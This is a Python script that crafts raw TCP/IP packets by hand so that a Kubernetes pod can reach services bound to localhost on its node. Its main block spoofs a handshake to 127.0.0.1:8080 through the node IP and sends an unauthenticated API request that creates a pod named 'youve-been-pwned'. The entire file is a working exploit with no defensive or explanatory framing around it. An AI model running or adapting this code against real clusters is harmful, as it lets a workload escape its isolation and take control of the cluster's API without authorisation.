import os
import array
import socket
import struct
import binascii

# IP/TCP checksum calculator
def chksum(packet: bytes) -> int:
    if len(packet) % 2 != 0:
        packet += b'\0'

    res = sum(array.array("H", packet))
    res = (res >> 16) + (res & 0xffff)
    res += res >> 16

    return (~res) & 0xffff

# Ethernet frame parsing utility functions
def ethernet_dissect(data):
    dest_mac, src_mac, protocol = struct.unpack('! 6s 6s H', data[:14])
    return mac_format(dest_mac), mac_format(src_mac), socket.htons(protocol), data[14:]

def mac_format(mac):
    mac = map('{:02x}'.format, mac)
    return ':'.join(mac).upper()

def ipv4_packet(ip_data):
    ip_protocol, source_ip, target_ip = struct.unpack('! 9x B 2x 4s 4s' , ip_data[:20])
    return ip_protocol, ipv4(source_ip), ipv4(target_ip), ip_data[20:]

def ipv4(address):
    return '.'.join(map(str, address))

# TCP/IP packet building
def build_packet(real_dst, dst, dst_port, src, src_port, seq_number, ack_number, tcp_flags, checksum):
    #tcp flags
    if "fin" in tcp_flags: fin = 1
    else: fin = 0
    if "syn" in tcp_flags: syn = 1
    else: syn = 0
    if "rst" in tcp_flags: rst = 1
    else: rst = 0
    if "psh" in tcp_flags: psh = 1
    else: psh = 0
    if "ack" in tcp_flags: ack = 1
    else: ack = 0
    if "urg" in tcp_flags: urg = 1
    else: urg = 0

    computed_flags = fin + (syn << 1) + (rst << 2) + (psh <<3) + (ack << 4) + (urg << 5)

    pak = TCPPacket(
        src,
        src_port,
        dst,
        dst_port,
        seq_number,
        ack_number,
        computed_flags,
        checksum
    )

    packet = pak.build_ip() + pak.build_tcp()

    return packet

# Read and parse ethernet frames for TCP/IP packet
def read_response():
    # receiving socket (raw ethernet frames)
    r = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
    r.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 2**30)
    r.bind(("eth0", 0x0003))

    while True:
        ethernet_data, address = r.recvfrom(65536)
        dest_mac, src_mac, protocol, ip_data = ethernet_dissect(ethernet_data)

        ip_protocol, source_ip, target_ip, ipdata = ipv4_packet(ip_data)

        if source_ip == dst:
            tcp_header = ipdata[:20]
            tcph = struct.unpack('!HHLLBBHHH' , tcp_header)
            source_port = tcph[0]
            dest_port = tcph[1]
            sequence = tcph[2]
            acknowledgement = tcph[3]
            doff_reserved = tcph[4]
            tcph_length = doff_reserved >> 4

            if dest_port == src_port:
                break

    tcph_length = tcph_length * 4
    response_data = ipdata[tcph_length:]

    r.close()
    return sequence, response_data

# Packet crafing class
class TCPPacket:
    def __init__(self,
                 src_host:  str,
                 src_port:  int,
                 dst_host:  str,
                 dst_port:  int,
                 sequence:  int,
                 ack:       int,
                 flags:     int,
                 checksum:  int):
        self.src_host = src_host
        self.src_port = src_port
        self.dst_host = dst_host
        self.dst_port = dst_port
        self.sequence = sequence
        self.ack = ack
        self.flags = flags
        self.checksum = checksum

    def build_tcp(self) -> bytes:
        packet = struct.pack(
            '!HHIIBBHHH',
            self.src_port,  # Source Port
            self.dst_port,  # Destination Port
            self.sequence,  # Sequence Number
            self.ack,       # Acknoledgement Number
            5 << 4,         # Data Offset
            self.flags,     # Flags
            8192,           # Window
            0,              # Checksum (initial value of 0)
            0               # Urgent pointer
        )

        pseudo_hdr = struct.pack(
            '!4s4sHH',
            socket.inet_aton(self.src_host),    # Source Address
            socket.inet_aton(self.dst_host),    # Destination Address
            socket.IPPROTO_TCP,                 # PTCL
            len(packet) + len(self.checksum)    # TCP Length
        )

        if len(self.checksum) == 0:
            checksum = chksum(pseudo_hdr + packet)
            packet = packet[:16] + struct.pack('H', checksum) + packet[18:]

        if len(self.checksum) != 0:
            checksum = chksum(pseudo_hdr + packet + self.checksum)
            packet = packet[:16] + struct.pack('H', checksum) + packet[18:]

        return packet

    def build_ip(self):
        ip_header  = b'\x45\x00\x00\x28'  # Version, IHL, Type of Service | Total Length
        ip_header += b'\xab\xcd\x00\x00'  # Identification | Flags, Fragment Offset
        ip_header += b'\x40\x06\x00\x00'  # TTL, Protocol | Header Checksum
        ip_header += socket.inet_aton(self.src_host)
        ip_header += socket.inet_aton(self.dst_host)

        checksum = chksum(ip_header)

        ip_header = ip_header[:4] + struct.pack('H', checksum) + ip_header[6:]

        return ip_header


if __name__ == '__main__':
    real_dst = os.environ['NODE_IP']
    dst = '127.0.0.1' # localhost IP
    dst_port = 8080 # kubelet port
    src = os.environ['POD_IP']
    src_port = 25565 # i like minecraft

    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

    # build and send the first packet: syn (no data)
    packet = build_packet(real_dst, dst, dst_port, src, src_port, 0, 0, ("syn"), "")

    s.sendto(packet, (real_dst, 0))
    response_sequence, _ = read_response()

    # build and send the second packet: ack (no data, don't expect response)
    ack = response_sequence + 1
    packet = build_packet(real_dst, dst, dst_port, src, src_port, 1, ack, ("ack"), "")

    s.sendto(packet, (real_dst, 0))

    # build and send the third packet: psh ack (with data)
    #data = b'GET / HTTP/1.0\r\nHost: 127.0.0.1\r\n\r\n'
    req_headers = b'POST /api/v1/namespaces/default/pods HTTP/1.0\r\nHost: 127.0.0.1\r\nContent-Type: application/json\r\nContent-Length: 213\r\n\r\n'
    payload = b'{"apiVersion":"v1","kind":"Pod","metadata":{"name":"youve-been-pwned"},"spec":{"containers":[{"name":"alpine","image":"alpine:latest","command":["/bin/sh","-c","--"],"args":["while true; do echo PWNED; done;"]}]}}'
    data = req_headers + payload
    tcp_flags = ("psh", "ack")
    packet = build_packet(real_dst, dst, dst_port, src, src_port, 1, ack, tcp_flags, data)
    packet += data

    s.sendto(packet, (real_dst, 0))
    _, response_data = read_response()
    print(response_data.decode("utf-8"))

    s.close()
